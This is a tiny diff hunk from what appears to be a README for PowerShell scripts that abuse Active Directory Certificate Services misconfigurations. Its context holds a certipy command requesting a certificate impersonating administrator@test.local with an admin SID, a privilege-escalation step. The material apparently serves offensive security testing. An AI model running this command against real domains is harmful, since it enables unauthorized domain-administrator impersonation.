@@ -35,5 +35,3 @@ PowerShell scripts to help with enumerating and abusing common misconfigurations
 5. Request cert with certipy
 ```
 `certipy req -u user@tgest.local -p 'password' -ca test-DC1-CA -template User -upn administrator@test.local -sid admin_sid -dc-ip 10.0.0.0`
-
-```
